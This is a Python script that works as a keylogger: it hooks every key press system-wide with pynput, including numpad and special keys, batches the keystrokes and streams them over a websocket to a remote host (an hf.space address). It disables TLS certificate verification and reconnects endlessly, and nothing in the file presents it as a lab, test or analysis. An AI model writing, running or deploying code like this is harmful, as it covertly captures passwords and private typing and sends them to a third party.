import asyncio
import websockets
from pynput import keyboard
from time import time
import sys
import logging
import ssl

# --- Platform-specific Num Lock detection ---
if sys.platform == "win32":
    import ctypes
    def is_num_lock_active():
        """Checks if Num Lock is active on Windows."""
        return bool(ctypes.windll.user32.GetKeyState(0x90) & 1)
else:
    # On non-Windows platforms, this check is not supported by default.
    def is_num_lock_active():
        """Fallback for non-Windows systems."""
        return True # Assume it's on

# --- Configuration ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
URI = "wss://NZE77-keys.hf.space/ws?type=sender"

# --- Core Functions ---

async def send_heartbeat(websocket, interval=30):
    """Sends a ping to the server every `interval` seconds to keep the connection alive."""
    while True:
        try:
            await websocket.ping()
            await asyncio.sleep(interval)
        except websockets.exceptions.ConnectionClosed:
            logging.info("Connection closed during heartbeat.")
            break

def run_keyboard_listener(queue: asyncio.Queue):
    """Listens for keyboard input in a separate thread and puts keys into an async queue."""

    def on_press(key):
        """Handles key presses, correctly identifying numpad keys first."""
        key_str = None
        numpad_vk_codes = range(96, 112) # Virtual key codes for numpad 0-9 and operators

        # Prioritize checking for numpad keys by their virtual key code (vk)
        if hasattr(key, 'vk') and key.vk in numpad_vk_codes:
            if is_num_lock_active():
                numpad_map = {
                    96: "0", 97: "1", 98: "2", 99: "3", 100: "4",
                    101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
                    110: ".", 111: "/", 106: "*", 107: "+", 109: "-"
                }
                key_str = numpad_map.get(key.vk)
            else: # Num Lock is OFF
                numpad_map = {
                    96: " {Insert} ", 97: " {End} ", 98: " {DownArrow} ",
                    99: " {PageDown} ", 100: " {LeftArrow} ", 101: " {Clear} ",
                    102: " {RightArrow} ", 103: " {Home} ", 104: " {UpArrow} ",
                    105: " {PageUp} ", 110: " {Delete} "
                }
                key_str = numpad_map.get(key.vk)
        else:
            # Fallback to original logic for all other keys
            try:
                key_str = key.char
            except AttributeError:
                special_keys = {
                    keyboard.Key.space: " ", keyboard.Key.enter: " [ENTER] ",
                    keyboard.Key.esc: " {esc} ", keyboard.Key.backspace: " {Backspace} ",
                    keyboard.Key.alt_l: " {Alt_L} ", keyboard.Key.alt_r: " {Alt_R} ",
                    keyboard.Key.shift: " {Shift} ", keyboard.Key.shift_r: " {Shift_R} ",
                    keyboard.Key.ctrl_l: " {Ctrl_L} ", keyboard.Key.ctrl_r: " {Ctrl_R} ",
                    keyboard.Key.delete: " {Delete} ", keyboard.Key.tab: " {Tab} ",
                    keyboard.Key.caps_lock: " {CapsLock} ", keyboard.Key.page_up: " {PageUp} ",
                    keyboard.Key.page_down: " {PageDown} ", keyboard.Key.insert: " {Insert} ",
                    keyboard.Key.home: " {Home} ", keyboard.Key.end: " {End} ",
                    keyboard.Key.up: " {UpArrow} ", keyboard.Key.down: " {DownArrow} ",
                    keyboard.Key.left: " {LeftArrow} ", keyboard.Key.right: " {RightArrow} ",
                    keyboard.Key.num_lock: " {NumLock} "
                }
                key_str = special_keys.get(key)

        if key_str:
            queue.put_nowait(key_str)

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

async def send_keys_from_queue(websocket, queue: asyncio.Queue):
    """Batches keys from the queue and sends them as a single message every 0.1 seconds."""
    buffer = []
    interval = 0.1  # seconds

    while True:
        start_time = time()
        while time() - start_time < interval:
            try:
                # Wait for a key, but with a short timeout to ensure the loop runs
                key = await asyncio.wait_for(queue.get(), timeout=0.01)
                
                if key is None:  # Exit signal from ESC key
                    if buffer: # Send any remaining keys before exiting
                        await websocket.send("".join(buffer))
                    return # Exit this task

                buffer.append(key)
                
            except asyncio.TimeoutError:
                pass # Expected when no keys are pressed
        
        if buffer:
            await websocket.send("".join(buffer))
            buffer.clear()

async def main():
    """Main function that includes an automatic reconnection loop."""
    queue = asyncio.Queue()

    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    
    while True: # Automatic reconnection loop
        try:
            async with websockets.connect(URI, ssl=ssl_context) as websocket:
                logging.info("Connected to server.")

                # Run all tasks concurrently
                heartbeat_task = asyncio.create_task(send_heartbeat(websocket))
                sender_task = asyncio.create_task(send_keys_from_queue(websocket, queue))
                listener_task = asyncio.to_thread(run_keyboard_listener, queue)

                await asyncio.gather(listener_task, sender_task, heartbeat_task)

        except ConnectionRefusedError:
            logging.warning("❗️ Connection failed. Is the server running? Retrying in 1 second...")
        except (websockets.exceptions.ConnectionClosed, OSError) as e:
            logging.warning(f"❗️ Disconnected or could not connect ({type(e).__name__}). Retrying in 1 second...")
        except Exception as e:
            logging.error(f"❗️ An unexpected error occurred: {e}. Retrying in 1 second...")
        
        # If the connection loop breaks for any reason, wait before retrying
        await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("Program interrupted by user (Ctrl+C).")